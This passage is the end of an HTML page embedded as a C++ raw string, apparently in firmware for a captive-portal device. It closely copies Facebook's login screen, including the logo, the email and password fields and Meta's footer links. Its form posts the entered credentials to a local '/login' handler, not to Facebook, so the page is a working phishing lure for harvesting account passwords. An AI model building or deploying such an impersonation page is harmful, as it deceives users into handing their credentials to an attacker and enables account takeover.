                <path d="M240 42.5C240 19.1 218.9 0 192.5 0S145 19.1 145 42.5c0 21.2 15.5 38.8 35.8 41.9V54.4h-10.8V42.5h10.8V33.4c0-10.7 6.4-16.6 16.1-16.6 4.7 0 9.6.8 9.6.8v10.5h-5.4c-5.3 0-7 3.3-7 6.6v8h11.8l-1.9 11.9h-9.9V84c20.3-3.1 35.8-20.7 35.8-41.9z"/>
            </svg>
        </div>
        
        <div class="login-card">
            <div class="login-title">Log in to Facebook</div>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <input type="text" name="email" class="input-field" placeholder="Email address or phone number" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="input-field" placeholder="Password" required>
                </div>
                
                <button type="submit" class="login-button">Log In</button>
            </form>
            
            <a href="#" class="forgot-password">Forgotten password?</a>
            
            <div class="divider"></div>
            
            <button class="create-account">Create new account</button>
        </div>
        
        <div class="create-page">
            <a href="#">Create a Page</a> for a celebrity, brand or business.
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">English (UK)</a>
                <a href="#">Español</a>
                <a href="#">Français (France)</a>
                <a href="#">Italiano</a>
                <a href="#">Português (Brasil)</a>
                <a href="#">Deutsch</a>
                <a href="#">العربية</a>
                <a href="#">हिन्दी</a>
                <a href="#">中文(简体)</a>
                <a href="#">日本語</a>
                <a href="#"><strong>+</strong></a>
            </div>
            
            <div class="divider"></div>
            
            <div class="footer-links">
                <a href="#">Sign Up</a>
                <a href="#">Log In</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Video</a>
                <a href="#">Places</a>
                <a href="#">Games</a>
                <a href="#">Marketplace</a>
                <a href="#">Meta Pay</a>
                <a href="#">Meta Store</a>
                <a href="#">Meta Quest</a>
                <a href="#">Imagine with Meta AI</a>
                <a href="#">Instagram</a>
                <a href="#">Threads</a>
                <a href="#">Fundraisers</a>
                <a href="#">Services</a>
                <a href="#">Voting Information Centre</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Privacy Centre</a>
                <a href="#">Groups</a>
                <a href="#">About</a>
                <a href="#">Create ad</a>
                <a href="#">Create Page</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Cookies</a>
                <a href="#">AdChoices</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
                <a href="#">Contact uploading and non-users</a>
            </div>
            
            <div class="language-line">
                <a href="#">Meta © 2024</a>
            </div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}